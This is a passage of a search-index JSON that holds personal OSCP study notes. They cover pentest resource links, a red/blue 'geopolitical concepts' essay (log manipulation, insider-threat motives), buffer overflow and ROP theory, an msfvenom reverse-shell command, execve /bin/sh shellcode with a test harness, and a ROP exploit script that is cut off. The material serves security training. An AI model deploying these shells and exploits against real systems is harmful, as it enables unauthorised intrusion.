{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"home","text":"<p>This resource serves as a place to collect all my notes created during my preparations for the OSCP exam. I initially kept this offline as an obsidian vault but I have chosen to make them public for two reasons:</p> <ol> <li>I have come to value the availability of having notes globally accessible</li> <li>One of the most rewarding things for me is sharing things that I found difficult to learn or discover</li> </ol> <p>I hope this resource can prove useful for others too. </p>"},{"location":"#resources","title":"resources","text":"<p>description</p> <pre><code>LINK\n</code></pre>"},{"location":"#preparation","title":"preparation","text":"<p>notes, study guides, test strategies</p> <pre><code>https://www.youtube.com/watch?v=Wqkr5S1b9gA&amp;ab_channel=AdithyanAK \nhttps://www.youtube.com/watch?v=V5sL0KQ0Usk&amp;ab_channel=BSidesDC \n</code></pre>"},{"location":"#lab-environment-sources","title":"lab environment sources","text":"<p>practice environments </p> <pre><code>https://www.vulnhub.com/about/ \nhttps://tryhackme.com/ \nhttps://www.hackthebox.com/ \nhttps://my.ine.com/ \n</code></pre>"},{"location":"#practice-resources-this-section-needs-review","title":"practice resources - this section needs review","text":"<p>subscribe to ippsec</p> <pre><code>https://ippsec.rocks/?#\nhttps://www.youtube.com/ippsec\n</code></pre> <p>Payloads &amp; TTP &amp; Checklists</p> <pre><code>https://github.com/swisskyrepo/PayloadsAllTheThings \n</code></pre> <p>huge generalist</p> <pre><code>https://book.hacktricks.xyz/ \n</code></pre> <p>huge; but searching/intelligence specific</p> <pre><code>https://github.com/edoardottt/awesome-hacker-search-engines\n</code></pre> <p>does what it says on the label</p> <pre><code>https://www.revshells.com/\n</code></pre> <p>windows AD interactive cheat sheet</p> <pre><code>https://wadcoms.github.io/\n</code></pre> <p>common resources</p> <pre><code>https://www.exploit-db.com/\nhttps://gtfobins.github.io/\nhttps://lolbas-project.github.io/\n</code></pre> <p>Raj Chandel's blog (REALLY HIGH VALUE), their adventures are always interesting</p> <pre><code>https://www.hackingarticles.in/ \n</code></pre> <p>windows GURU; search: harmj0y+Topic to get relvant help</p> <pre><code>https://blog.harmj0y.net/about/\n</code></pre>"},{"location":"#tools-and-resources-similar-to-this-one","title":"tools and resources similar to this one","text":"<ul> <li>https://book.hacktricks.xyz/welcome/readme</li> <li>https://www.ired.team/</li> <li>https://github.com/swisskyrepo/PayloadsAllTheThings</li> <li>https://github.com/tennc</li> <li>https://ippsec.rocks/?#</li> <li>https://www.youtube.com/ippsec</li> </ul>"},{"location":"geopolitical_concepts/","title":"geopolitical_concepts","text":"<p>Each section of this document includes:</p> <ul> <li>a brief introduction to the concept</li> <li>a break down of the concept into its component parts</li> <li>a red team and a blue team implementation of the component part</li> <li>considerations</li> </ul>"},{"location":"geopolitical_concepts/#control-impose-your-will-on-the-adversary","title":"control - impose your will on the adversary","text":"<p>\"... supposing to ourselves two wrestlers. Each strives by physical force to compel the other to submit to his will: each endeavors to throw his adversary, and thus render him incapable of further resistance.  </p> <p>War therefore is an act of violence intended to compel our opponent to fulfill our will.\u201d  </p> <ul> <li>Carl Von Clausewitz, On War</li> </ul> <p>The concept we are abstracting is \"imposition of your will on another entity\". This is not limited to governments and violence. Enterprises and non-capitalist entities will also adopt aspects of these concepts in their pursuit of competition.</p>"},{"location":"geopolitical_concepts/#dime","title":"DIME","text":"<p>An acronym used in geopolitical discourse to describe how a government can impose their will on another entity</p> <ul> <li>Diplomacy</li> <li>Information</li> <li>Military</li> <li>Economy</li> </ul>"},{"location":"geopolitical_concepts/#diplomacy","title":"Diplomacy","text":"<p>Almost no abstraction needed here.  Notably, diplomacy is often limited to within the respective organizations. </p> <p>For both red and blue teams:</p> <ul> <li>diplomatic relations between other friendly teams is often what leadership contributes to on the day to day</li> </ul>"},{"location":"geopolitical_concepts/#information","title":"Information","text":"<p>Interpret this literally. Control over information is what we do.</p> <p>A blue team could implement the following:</p> <ul> <li>do not disclose more than what is required to friendlies</li> <li>security awareness campaigns</li> <li>do not publicly announce anything that is not absolutely necessary</li> </ul> <p>A Red team could implement the following:</p> <ul> <li>destruction/manipulation of logs</li> <li>obfuscation of commands, payloads, methods</li> <li>emulate the TTPs of another red team</li> </ul>"},{"location":"geopolitical_concepts/#military","title":"Military","text":"<p>The notion of military power can be abstracted to include any kinetic means. Kinetic means offer some of the best opportunities for creativity. Alongside these opportunities however are also opportunities to step out of professional scope. Caution is advised. </p> <p>A blue team could implement kinetic means in the following ways:</p> <ul> <li>Secure design. </li> <li>Screens with sensitive information do not face an open room</li> <li>creating and enforcing bottlenecks, physical and logical</li> <li>denial of face to face services, i.e. choose your arena, homefield advantage</li> </ul> <p>A red team could implement kinetic means in the following ways:</p> <ul> <li>use of drones to gain access to WIFI</li> <li>tailgating: following closely through a checkpoint to circumvent authentication</li> <li>destructive methods for initial access or to create a situation. Note that this is extremely unlikely to ever be within scope</li> </ul>"},{"location":"geopolitical_concepts/#economy","title":"Economy","text":"<p>Money is just another resource. It is a way for imposing your will on the world. Most implementations of geopolitical economic actions do not translate to our activities, they would be out of professional scope. It is important to consider that the only reason corporate security roles exist is due to their economic impact. Direct action on the adversary's economy is almost universally out of professional scope. </p> <p>A blue team could implement the following:</p> <ul> <li>budget considerations, spend all or return a residue ?</li> <li>argue based of the economic impact of failure to comply</li> </ul> <p>A red team could implement the following:</p> <ul> <li>when constructing remediation reports, economic impact should be communicated effectively</li> <li>limiting your budget and producing significant results can lend a great weight to your findings</li> </ul>"},{"location":"geopolitical_concepts/#treason-targeting-the-human-element","title":"treason - targeting the human element","text":"<p>Humans are the weak point in most modern organizations. We abstract treason as a representation of an insider threat. This can be further abstracted to reasons for which an individual's interests diverge from the organization's interests.</p>"},{"location":"geopolitical_concepts/#mice","title":"MICE","text":"<p>An acronym for memorizing some common motives for treason. </p> <ul> <li>Money</li> <li>Ideology</li> <li>Coercion</li> <li>Ego</li> </ul> <p>These can be applied to social engineering campaigns to leverage insiders to enable our operations. These also prove to be valuable considerations when strategizing for defensive engagements. </p>"},{"location":"geopolitical_concepts/#money","title":"Money","text":"<p>Unlikely to be within scope for the red team, except in the case of employee retention. However, as blue it must be considered. </p> <p>The following questions are good starters for strategy:</p> <ul> <li>are we paying our employees enough to stay on our team?</li> <li>are we paying our employees enough to afford a quality of life? </li> <li>are our employees vulnerable to traditional bribes? is it likely that could happen?</li> </ul>"},{"location":"geopolitical_concepts/#ideology","title":"Ideology","text":"<p>This concept should be the highest priority for your considerations. </p> <p>The following questions are relevant for both red and blue teams:</p> <ul> <li>do the actions of the company align with the morals and ethics of its employees?</li> <li>is \"whistle blowing\" a possibility for employees? do the laws of the containing country favor whistleblowers or the enterprise?</li> </ul> <p>Notably for the red team, trying to social engineer someone's ideology into initial access should have at a minimum the following considerations:</p> <ul> <li>is this within scope?</li> <li>does the length of the engagement enable such an action?</li> <li>is this ethical?</li> </ul>"},{"location":"geopolitical_concepts/#coercion","title":"Coercion","text":"<p>Unlikely to be within scope for either team. I am hesitant to outright suggest anything here. This section is left as an exercise to the reader. </p> <ul> <li>please use your best judgement.</li> <li>before implementation, please \"sanity check\" any ideas you may have against an secondary source</li> </ul>"},{"location":"geopolitical_concepts/#ego","title":"Ego","text":"<p>Operationalizing this concept is not straight forward. The concept itself is as follows: someone whose ego is not satisfied by their work is vulnerable to committing treason. </p> <p>Blue teams should care about this for the following reasons:</p> <ul> <li>employee retention</li> <li>securing employees enables a secure workplace</li> <li>insider threats are a rising trend; motives often cited are retaliation for workplace mistreatment</li> </ul> <p>Red teams should consider the following:</p> <ul> <li>the length of the engagement might prevent cultivation such as this</li> <li>is this within scope?</li> <li>is this ethical?</li> </ul>"},{"location":"index-of-oscp_field_manual/","title":"Index of oscp field manual","text":"<ul> <li>index-of-binary_exploitation</li> <li>index-of-firewall_evasion</li> <li>index-of-freedom_of_movement</li> <li>index-of-hash_cracking</li> <li>index-of-linux</li> <li>index-of-metasploit_framework</li> <li>index</li> <li>proof_of_concept</li> <li>index-of-report_writing</li> <li>index-of-shells</li> <li>index-of-web</li> <li>index-of-windows</li> <li>geopolitical_concepts</li> <li>index-of-docker</li> </ul>"},{"location":"proof_of_concept/","title":"proof of concept","text":"<p>often when trouble shooting exploits we must understand syntax specific to some programming language</p>"},{"location":"proof_of_concept/#vulnerability-specific-tips","title":"vulnerability specific tips","text":"<p>When doing research on specific protocols consult:</p> <pre><code>RFC/IETF            # internet engineering task force\n# usually have excellent whitepapers giving info needed\n</code></pre>"},{"location":"proof_of_concept/#command-execution","title":"command execution","text":"<p>If you control config files, you can likely get command execution</p> <p>Try the most base, elemental, features of command execution; such as <code>id</code>, <code>ping</code> etc. </p> <ul> <li>The <code>ping</code> + <code>tcpdump icmp</code> method is especially good for blind/limited feedback RCE!!</li> </ul>"},{"location":"proof_of_concept/#cmdline-http-traffic","title":"cmdline http traffic","text":"<p>In bash the env var <code>http_proxy</code> will cause any http traffic of your child processes to pass through the proxy you specify.</p> <pre><code>export http_proxy 127.0.0.1:8080\n# or wherever you have burp setup to listen\n</code></pre> <p>This is particularly useful for troubleshooting exploits and scripts. </p>"},{"location":"proof_of_concept/#language-specific-tips","title":"language specific tips","text":""},{"location":"proof_of_concept/#python","title":"python","text":"<p>interactive mode</p> <pre><code>python -i exploit.py            ; runs script in interactive mode, interprets all lines then maintains so u can interact\n</code></pre> <p>similar to interactive mode, the python debugger allows for understanding of other code &amp; powerful troubleshooting     </p> <pre><code>import pdb\n\npdb.set_trace()     # like a breakpoint\n\n# after doing the exec the python script and it will drop you into pdb where gdb like commands can be used to query values\n# reference\n# https://www.youtube.com/watch?v=qECG2_8xw_s&amp;t=1740s&amp;ab_channel=IppSec\n</code></pre> <p>list all object attributes</p> <pre><code>dir([object])       ; list all attributes in an object, get info about the object recursively\ndir(None)           ; returns names in current scope\n</code></pre> <p>debugging</p> <pre><code>print(my_var)\ninput()\nor\nprint(f'{my_var=}')  ; note that we can put all kinds of expressions in here\ninput\n</code></pre> <p>requests library; dealing with large DATA use the docstring! it is a multiline literal string</p> <pre><code>data = \"\"\" HEADER \"\"\"\n</code></pre> <p>nice aesthetic rolling text</p> <pre><code>import sys\n\nsys.stdout.write( f\"...\" ) # creates some nice rolling text due\nsys.stdout.flush()         # do this when done to clear the write buffer\n</code></pre>"},{"location":"proof_of_concept/#php","title":"php","text":"<p>interactive mode</p> <pre><code>php -a      \n// opens an interactive session for doing tests, similar to python REPL\n</code></pre>"},{"location":"OPCODE_DICTIONARY/x86-64/","title":"x86-64 Instruction Set","text":"<p>Entries are documented as they are encountered during operations. </p> <p>Each entry consists of </p> <ul> <li>definition</li> <li>use cases</li> </ul>"},{"location":"OPCODE_DICTIONARY/x86-64/#xcc","title":"<code>\\xcc</code>","text":""},{"location":"OPCODE_DICTIONARY/x86-64/#definition","title":"Definition","text":"<ul> <li>software breakpoint</li> </ul>"},{"location":"OPCODE_DICTIONARY/x86-64/#use-cases","title":"Use Cases","text":"<ul> <li>Debug buffer overflow payloads locally</li> <li>Adding breakpoints to buffer overflow payloads, investigate stack at some point in during payload execution.</li> </ul>"},{"location":"OPCODE_DICTIONARY/x86-64/#xe9","title":"<code>\\xe9</code>","text":""},{"location":"OPCODE_DICTIONARY/x86-64/#definition_1","title":"Definition","text":"<ul> <li>jump, <code>jmp</code>.</li> <li>short jump.</li> <li>requires a 16 or 32 bit <code>rip</code> relative address to follow <code>\\xe9</code>.</li> <li>32 bit relative address is more common.</li> </ul>"},{"location":"OPCODE_DICTIONARY/x86-64/#use-cases_1","title":"Use Cases","text":"<ul> <li><code>ret</code> trampolines for function hooking.</li> <li>Windows function hooking. </li> <li>Manual inline function hooking.</li> </ul>"},{"location":"binary_exploitation/binary_exploitation-home/","title":"binary_exploitation-home","text":"<p>which decompiler ?  in order to be tried</p> <pre><code>Cutter\nghidra\nida free (if avail)\n</code></pre>"},{"location":"binary_exploitation/binary_exploitation-home/#the-default-enumeration","title":"The Default Enumeration","text":"<p>We want to do each of the following at least once. Take care to read the output at least once before grepping. </p> <ol> <li><code>strings</code> - do at least two character encodings, filter strings by length</li> <li><code>ltrace</code> - traces library calls, we care about things we can write to or evidence of <code>PATH</code> issues</li> <li><code>strace</code> - trace system calls and signals, take note of <code>exec*</code> paths </li> <li><code>ldd</code> - prints shared object dependencies. similar to <code>ltrace</code> but yields file system paths</li> </ol>"},{"location":"binary_exploitation/binary_exploitation-home/#scripting-repeated-analysis","title":"scripting repeated analysis","text":"<p>Bash redirection can be used to repeat command entry. Commands should be new line seperated. </p> <pre><code>./bad_binary &lt; commands.txt\n</code></pre> <p>Some binaries may become unresponsive, in which case tmux scripting is prefered. Employ the <code>run-shell</code> command and as script containing several <code>send-keys</code> commands. </p>"},{"location":"binary_exploitation/binary_exploitation-home/#analyzing-file-strings","title":"analyzing file strings","text":"<p>strings op!!!</p> <pre><code>strings -n 8 FILE_NAME              ; only display strings a min lenth of 8\n</code></pre> <p>if strings fails, try <code>cat</code> on the binary. Have your terminal <code>reset</code> ready!</p>"},{"location":"binary_exploitation/binary_exploitation-home/#multiple-encoding-types","title":"multiple encoding types","text":"<p>Always try at least 2 encodings when doing strings analysis. Consult man page for full options</p> <pre><code>strings -e l ~/path/to/file\n</code></pre> <ul> <li><code>-e</code> to specifiy an ecoding</li> <li><code>l</code> is 16-bit Little Endian</li> <li><code>L</code> is 32-bit Little endian</li> <li><code>b</code> is 16-bit Big Endian</li> <li><code>B</code> is 32-bit Big Endian</li> </ul>"},{"location":"binary_exploitation/binary_exploitation-home/#dynamic-analysis","title":"dynamic analysis","text":"<p>sudo dmesg|tail ; john hammond methodology</p> <pre><code>sudo dmesg|tail # will yield feedback of the nature of a program crash\n# useful for when we are attempting basic buffer over flows;\n# feedback includes\n# attempted return address; which is critical for calculating the offset required for the first return in ROP chain\n\n#The dmesg command is a Linux utility that displays kernel-related messages retrieved from the kernel ring buffer. \n#The ring buffer stores information about hardware, device driver initialization, and messages from kernel modules that take place during system startup.\n</code></pre> <p><code>readelf</code></p> <pre><code>possibly for getting section info\n</code></pre> <p><code>strace</code> and <code>ltrace</code> ; note <code>ltrace</code> is more friendly</p> <pre><code>dumps system calls observed during execution\n</code></pre>"},{"location":"binary_exploitation/binary_exploitation-home/#ropper","title":"ropper","text":"<p>return orient programming; gadget search and creation tool</p> <p>Really cool tool, need more exposure.</p>"},{"location":"binary_exploitation/binary_exploitation-home/#gdb","title":"gdb","text":"<pre><code>set follow-fork-mode child           # follow the child process \npattern create length                # length may be an integer\npattern offset RBP_VALUE_AT_CRASH    # get the offset of stored RIP\n</code></pre> <p>use printf instead of python3; python2 is also okay python3 does some garbage with your hex, do not trust it</p>"},{"location":"binary_exploitation/binary_exploitation-home/#link-dump-bookmarks","title":"link dump &amp; bookmarks","text":"<p>explanation</p> <pre><code>LINK\n</code></pre> <p>Stack buffer overflow on a x64 system; note the canonical addresses discussion &amp; GEF: GNU Extended Features for GDB</p> <pre><code>https://www.youtube.com/watch?v=eg0gULifHFI&amp;ab_channel=JohnHammond\n</code></pre> <p>compiler/decompiler online tools</p> <pre><code>https://godbolt.org/\nhttps://dogbolt.org/\n</code></pre>"},{"location":"binary_exploitation/index-of-binary_exploitation/","title":"Index of binary exploitation","text":"<ul> <li>binary_exploitation-home</li> <li>buffer-overflow</li> <li>shared-linked-library-high-jacking</li> <li>shellcode</li> </ul>"},{"location":"binary_exploitation/shellcode/","title":"shellcode","text":""},{"location":"binary_exploitation/shellcode/#theory-and-definitions","title":"theory and definitions","text":"<p>Shellcode is the traditional name for the assembly opcodes that are used during exploitation of a buffer overflow vulnerability, resulting in a shell on the target. The assembly opcodes are what the CPU sees and understands during execution. We have a one to one mapping between assembly instructions and opcodes, everything comes back down to assembly and integers. Fundamentally, if we want the CPU to do something then an opcode must exist to communicate the task to the CPU. </p> <p>From an execution flow perspective, the <code>rip</code> register contains an address that points to the next opcode to execute. If we can store custom opcode somewhere inside a binary, then if we ever get control over the contents of <code>rip</code> register we can execute arbitrary assembly instructions. </p>"},{"location":"binary_exploitation/shellcode/#creating-shellcode","title":"creating shellcode","text":"<p>these processes are more art than science, be prepared to be patient do some debugging. Strive to first get a minimal proof of concept</p>"},{"location":"binary_exploitation/shellcode/#manual-methods","title":"manual methods","text":"<p>To manually create shell code, the operative must do the following</p> <ol> <li>write desired functionality in assembly</li> <li>create an object file with <code>nasm</code> or another assembler</li> <li>disassemble with <code>objdump -D -M intel</code> to display the opcodes</li> <li>extract the opcode strings from the text-glob output with tools such as <code>grep</code>, <code>sed</code>, <code>cut</code>, and <code>awk</code></li> <li>prepare the resulting hexadecimal string to be compliant with whatever syntax is used for the delivery method. Whether that is is <code>C-lang</code> or <code>python</code> or otherwise. </li> <li>Test the payload locally with an appropriate harness, see later on this page</li> </ol>"},{"location":"binary_exploitation/shellcode/#cleaning-shellcode-avoiding-nulls-and-bad-chars","title":"cleaning shellcode, avoiding NULLs and bad chars","text":"<ol> <li>clean registers before use<ol> <li><code>xor rdx, rdx</code></li> </ol> </li> <li>some instructions introduce nulls, such as <code>mov</code>. avoid them<ol> <li>accomplish same task with multiple instructions. These instructions do not introduce NULLs:<ol> <li><code>add rdx, 0x01</code></li> <li><code>sub rdx, 0x01</code></li> <li><code>inc rdx</code></li> <li><code>dec rdx</code></li> </ol> </li> </ol> </li> <li>if you must use <code>mov</code> instruction, use minimal register size appropriate for size of integer<ol> <li><code>mov dl, 0x01 ; 1 byte into a 1 byte register</code></li> </ol> </li> <li>use <code>rip</code> relative addressing and store data earlier in the text section to force an offset without NULLs. This is a result of the offset being expressed as a signed integer, a negative number, something like <code>0xfffffffffffffffc</code></li> </ol> <p>The <code>rip</code> relative addressing technique is best demonstrated through example. Consider the following assembly. Pay attention to the offset when assessing the output of <code>objdump -D -M intel</code>. The offset presents itself in the resulting opcode, this is why an offset such as <code>0x0000000000000002</code> introduces NULL bytes. </p> <pre><code>global _start\n\nsection .text\n\n_start:\n\n    jmp code\n    hello_world: db 'hello world', 0x0a\n\ncode:\n\n    mov al, 1\n    xor rdi, rdi\n    add rdi, 1\n    lea rsi, [rel hello_world]\n    xor rdx, rdx\n    add rdx, 12\n    syscall\n\n    xor rax, rax\n    add rax, 60\n    xor rdi, rdi\n    syscall\n\n</code></pre>"},{"location":"binary_exploitation/shellcode/#tool-assisted-methods","title":"tool assisted methods","text":"<p>The <code>msfvenom</code> utility of the Metasploit framework can be used to create all sorts of payloads, including shellcode. Example shown is for creating a reverse shell for a 64 bit linux target.</p> <pre><code>msfvenom -a x64 -p linux/x64/shell_reverse_tcp -b \"\\x00\" -f c LHOST=10.10.10.10 LPORT=8000\n</code></pre> <p>Notes on the above command</p> <ul> <li>the <code>-b</code> flag allows us to declare \"bad chars\". Other bad chars include <code>\"\\xff\"</code> , <code>\"\\x0a\"</code>, and more depending on context of the vulnerability and the target. can be declared en masse via <code>-b \"\\xff\\x00\\x0a\"</code></li> <li>It is not necessary to use the other tools in Metasploit framework to catch the resulting connection, any socket listener will work.</li> </ul>"},{"location":"binary_exploitation/shellcode/#harness-for-testing-shellcode","title":"harness for testing shellcode","text":"<p>The following is shellcode to achieve: <code>execve( \"/bin/sh\", {\"/bin/sh\", NULL}, NULL )</code></p> <pre><code>\"\\x48\\x31\\xc0\\x50\\x48\\x89\\xe2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\"\n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    unsigned char code[] = \"\"; // payload goes here after sed/regex or msfvenom\n\n    printf(\" shell length: %d\\n\", (int)strlen(code) );\n    int (*ret) () = (int(*) ()) code;\n    ret();\n}\n</code></pre>"},{"location":"binary_exploitation/buffer_overflow/index-of_buffer-overflow/","title":"Index of buffer overflow","text":"<ul> <li>case-studies</li> <li>intro-to-buffer-overflow</li> </ul>"},{"location":"binary_exploitation/buffer_overflow/intro-to-buffer-overflow/","title":"intro-to-buffer-overflow","text":""},{"location":"binary_exploitation/buffer_overflow/intro-to-buffer-overflow/#theory-stack-based-buffer-overflow","title":"theory - stack based buffer overflow","text":"<p>When compiling examples, dissable address randomization and stack protections. Use <code>gcc -fno-stack-protector -z exec stack</code> and ensure that <code>/proc/sys/kernel/randomize_va_space</code> has value 1.</p> <p>This category of exploits work because of the nature of the data structure called the stack. To accelerate our discussion, here are a few aspects of the stack data structure:</p> <ul> <li>used to store variables which have size/length at compilation time</li> <li>bytes get added to or removed from the stack with <code>push</code> and <code>pop</code> assembly instructions respectively</li> <li>the value of <code>rsp</code> register is an address that points to the most recent value added to the stack</li> <li>the value of <code>rbp</code> register is an address that points to the base of the stack frame</li> <li>during execution, each function gets its own stack frame</li> <li>when a value is added to the stack, the address inside <code>rsp</code> is decremented. This is the fundamental feature that enables the exploit. </li> <li>when we write bytes to some location on the stack, consecutive bytes are written by incrementing the address we are writing to. Therefore whenever we write to the stack, if we mis manager our pointer then we may overwrite data previously pushed to the stack.</li> </ul> <p>The intuition so far may be, \"so what? we can overwrite data, maybe break something\". However, it becomes clear how this can be weaponized once we examine exectution flow control. A major aspect of flow control is implemented by the stack, that being return addressing. When a function is called, we need a way to continue to execute the assembly instructions once the function has finished its work. When <code>functionA</code> calls <code>functionB</code> a new stack frame is built and two important values are saved onto the stack by doing <code>push</code> instructions. </p> <ol> <li><code>push rip</code></li> <li><code>push rbp</code></li> </ol> <p>these values will be referred to as \"saved <code>rip</code>\" and \"saved <code>rbp</code>\", note that saved <code>rbp</code> is at a lower memory address than saved <code>rip</code> due to how the stack is implemented. </p> <p>The register <code>rip</code> contains an address that points to the next assembly instruction, by saving the value of <code>rip</code> on the stack, we can easily pick up where we left off after <code>functionB</code> finishes its work. Note that <code>rbp</code> is saved to the stack so that the context/scope of <code>functiionA</code> can easily be resumed, <code>rbp</code> being saved on the stack is not fundamental to achieving code execution. </p> <p>Time to put it all together. When user input is stored on the stack, there is a possibility of this exploit occurring. Without proper controls, a user may provide longer and longer inputs. When these inputs are stored on the stack at some address, they are written by increasing the address for each consecutive byte. With sufficiently large input, the size of the stack frame may be exhausted, overwriting  <code>functionA</code> 's  saved <code>rbp</code> value, and overwriting <code>functionA</code>'s saved <code>rip</code> value to any address the user wants. When <code>functionB</code> returns, instead of returning to <code>functionA</code>'s next instruction, execution returns to the address provided by the user.</p> <p>The impacts of this are limited to our own creativity and the size of the buffer on the stack. The traditional way to get arbitrary code execution is to overwrite saved <code>rip</code> to be an address inside the buffer we can write to.  This is more easily done when access to the binary is available and we can debug to hunt for addresses. When debugging is not an option but binary is still available locally, spraying the buffer and hunting for relevant <code>dmesg</code> output is the best starting point. </p>"},{"location":"binary_exploitation/buffer_overflow/intro-to-buffer-overflow/#a-note-on-delivery-methods","title":"a note on delivery methods","text":"<p>How the payload is delivered to the target and the buffer our target binary uses to receive the payload can significantly impact the exploitation process. Some example delivery/receipt methods are:</p> <ul> <li>Remote/network<ul> <li>netcat, telnet, socat</li> </ul> </li> <li>Is the binary reading from <code>stdin</code> or a command line argument such as <code>argv[1]</code>? </li> <li>Internal to the program? At some point after execution has begun.</li> </ul> <p>In particular, shell interpreters such as <code>bash</code> will introduce tokenization errors in our payload since <code>0xff</code> and <code>0x0a</code> are considered white space and will cause our payload to be split over several <code>argv</code> indexes. For remote delivery, telnet and netcat handle the <code>enter</code> key differently, this can affect how the payload is delivered, potentially breaking it up into tokens. </p> <p>To mitigate these issues, the following should be considered:</p> <ul> <li>is the target source code available?</li> <li>what tests can we conduct to determine if our payload is being tokenized?</li> <li>for <code>bash</code>-like interpreters we can force our payload into a single token by implementing <code>\"\"$(cat payload.txt)\"\"</code>, the <code>\"</code> characters allow substitutions, thus forcing our payload into <code>argv[1]</code></li> </ul> <p>Experience should be valued over theory when preparing for a campaign that includes binary exploitation.  </p>"},{"location":"binary_exploitation/buffer_overflow/intro-to-buffer-overflow/#methodology","title":"methodology","text":""},{"location":"binary_exploitation/buffer_overflow/intro-to-buffer-overflow/#calculating-the-offset-of-saved-rip","title":"calculating the offset of saved RIP","text":"<p>The debugger <code>gdb-peda</code> offers tools for exploit development implemented in python. Below is procedure for getting the offset of saved <code>rip</code>:</p> <ol> <li>debug the binary with <code>gdb-peda</code></li> <li>set breakpoint on <code>functionA</code> that calls <code>functionB</code>. Note that <code>funcitonB</code> contains the vulnerable buffer. Often <code>functionA</code> is simply <code>main</code></li> <li>use <code>pattern_create 500 pattern.txt</code> to write a file containing a non repeating sequence. Note these are often implemented as Debruijn sequences.</li> <li>run the binary with the pattern in the buffer, <code>run &lt; pattern.txt</code> for standard input or <code>run $(cat pattern.txt)</code> for <code>arvg[1]</code></li> <li>continue until program crashes, the current value of <code>rsp</code> is the address we tried to return to. We can print it via <code>x/wx $rsp</code>.  Call this <code>FAILED_RET</code>. It is at this time where we measure addresses for <code>NOP</code> sled technique or estimate address spaces if address space randomization is implemented. Stack crash analysis should be done at this point. </li> <li>We now need to find <code>FAILED_RET</code>, in our pattern. <code>gdb-peda</code> does this for us via <code>pattern_offset FAILED_RET</code></li> <li><code>gdb-peda</code> yields the offset, lets say <code>n</code>. We can now build our payload. Note we will only have <code>n</code> bytes to include any shellcode, padding etc, that we want for our exploit.</li> </ol> <pre><code>\"A\"*n + DESIRED_ADDRESS_LITTLE_ENDIAN\n</code></pre>"},{"location":"binary_exploitation/buffer_overflow/intro-to-buffer-overflow/#nop-sled-guarantee-correct-return-address-bypass-address-randomization","title":"NOP sled - guarantee correct return address - bypass address randomization","text":"<p>One difficulty associated with buffer overflow is finding which address to use when overwriting saved <code>rip</code> . This is further complicated when the system has robustly implemented address space layout randomization (ASLR), that is on process creation not simply at boot time. We can reduce these challenges by utilizing a <code>NOP</code> sled. A <code>NOP</code> is an assembly instruction that results in no operation, it takes a moment of time, then proceeds to the next instruction. Understanding of the intended usage of <code>NOP</code>s is not necessary for the exploit.</p> <p></p> <p>By using the byte <code>\\x90</code> as padding, we can overwrite saved <code>rip</code> to point at any of <code>NOP</code>s in the buffer. Address of a <code>NOP</code> should be calculated at the same point in debugging as when we calculate the <code>SAVED_RIP</code> offset. </p> <p></p> <p>This is especially potent when conditions reduce the amount of starting knowledge we can get about the binary.  Technique is powerful for implementing brute force solutions with scripting languages or for remote exploits.</p>"},{"location":"binary_exploitation/buffer_overflow/intro-to-buffer-overflow/#rop-chains-bypassing-data-execution-prevention","title":"ROP chains - bypassing Data Execution Prevention","text":""},{"location":"binary_exploitation/buffer_overflow/intro-to-buffer-overflow/#theory","title":"theory","text":"<p>Data execution prevention is a policy implemented at compile time that stops execution from within the data section of the binary. The buffers we have been exploited thus far are all contained in the data section, this policy disables all of our established methods.</p> <p>What we can do instead is leverage return oriented programming to \"live off the land\", using what is within the valid sections of the image to achieve what we want. With a library such as <code>libc</code>  (contains system calls) included in the image, we can get access to relevant strings such as</p> <ul> <li><code>/bin/sh</code></li> <li><code>system()</code></li> <li><code>execve()</code></li> <li><code>dup2()</code></li> <li><code>NULL</code></li> <li>more can be found by debugging with <code>gdb-peda</code> and using <code>find</code> to search for strings</li> </ul>"},{"location":"binary_exploitation/buffer_overflow/intro-to-buffer-overflow/#procedure","title":"procedure","text":"<p>To build a ROP chain, we need to </p> <ol> <li>get the offset of saved <code>rip</code></li> <li>we need addresses of relevant assembly instructions in the image</li> <li>we need to respect calling convention, so to execute <code>system(\"/bin/sh\")</code> we must first load the string into <code>rdi</code> then return to the address of <code>system()</code> i.e. <code>__libc_system</code></li> <li>we achieve this through gadgets, we overwrite saved <code>rip</code> to point to the gadget <code>pop rdi; ret</code></li> <li>When the vulnerable function returns to the address of our gadget, calling convention causes stack frame to be collapsed, resulting in <code>rsp</code>  pointing to whatever was after saved <code>rip</code> in our payload. Therefore <code>rsp</code> is pointing to the correct position for the <code>pop</code> instruction. </li> </ol> <p>Okay, that's great. How do I get the address ? If debugging is available, <code>gdb-peda</code> has two essential capabilities </p> <ol> <li><code>find STRING_GOES_HERE</code> for finding string addresses</li> <li><code>asmsearch  pop ?; ret</code> for finding any <code>pop</code> instructions, followed by <code>ret</code></li> </ol> <p>If debugging is unavailable, then it possible to remotely expose base addresses through the <code>/proc</code> file system. This is particularly attractive due to <code>/proc</code> frequently being accessible through remote information disclosure methods such as remote file inclusion. </p> <ol> <li>get base addresses from <code>/proc</code></li> <li>get offsets from the <code>libc.so.6</code> on your local system, may need to hunt versions if target is out of date</li> <li>perform the calculation then proceed as detailed above</li> </ol>"},{"location":"binary_exploitation/buffer_overflow/case-studies/basic-rop/","title":"basic-rop","text":""},{"location":"binary_exploitation/buffer_overflow/case-studies/basic-rop/#source","title":"source","text":"<pre><code>// rop.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\nint overflow() {\n    char buf[80];\n    int r;\n\n    read( 0, buf, 500 );\n    printf(\"the buffer content %d, %s\\n\", r, buf );\n\n    return 0;\n}\n\nint main(int argc, char const *argv[])\n{\n    printf(\"starting /bin/ls\\n\");\n    overflow();\n    return 0;\n}\n</code></pre>"},{"location":"binary_exploitation/buffer_overflow/case-studies/basic-rop/#payload-generation-script","title":"payload generation script","text":"<pre><code>#!/usr/bin/python\nfrom struct import *\n\nbuffer = b''\nbuffer += b'A'*104\nbuffer += pack( \"&lt;Q\", 0x000055555555522b)   # ROP gadget: pop rdi; ret\n# stack frame is reset when we ret to 0x000055555555522b\nbuffer += pack( \"&lt;Q\", 0x7ffff7f6c882)       # pointer to /bin/sh  \n# 0x7ffff7de9a8d id                         # this works, PATH is set for system()\nbuffer += pack( \"&lt;Q\", 0x7ffff7e1d860)       # address of libc function, system()\nf = open( \"rop.txt\", \"wb\" )\nf.write( buffer 